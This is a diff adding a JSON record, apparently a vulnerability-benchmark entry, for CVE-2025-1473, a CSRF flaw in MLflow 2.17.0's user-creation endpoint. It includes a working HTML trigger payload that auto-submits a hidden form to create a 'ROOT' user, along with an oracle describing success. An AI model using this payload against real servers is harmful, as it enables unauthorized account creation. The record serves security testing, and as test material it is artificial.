@@ -1,0 +1,15 @@
+{
+  "file_id": "196_mlflow_huntr_43dc50b6-7d1e-41b9-9f97-f28809df1d45",
+  "numeric_id": "196",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "CSRF vulnerability in MLflow signup page allows unauthorized user creation",
+  "cve": "CVE-2025-1473",
+  "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)",
+  "library": "mlflow/mlflow",
+  "affected_version": "== 2.17.0",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "<!DOCTYPE html> <html lang=\"en\"> <head> <meta charset=\"UTF-8\"> <title>CSRF Attack</title> </head> <body onload=\"document.forms['csrfForm'].submit();\"> <form id=\"csrfForm\" action=\"http://127.0.0.1:5000/api/2.0/mlflow/users/create\" method=\"POST\"> <input type=\"hidden\" name=\"username\" value=\"ROOT\"> <input type=\"hidden\" name=\"password\" value=\"ROOT\"> </form> </body> </html>",
+  "oracle": "A new user is created in MLflow without the victim's consent"
+}
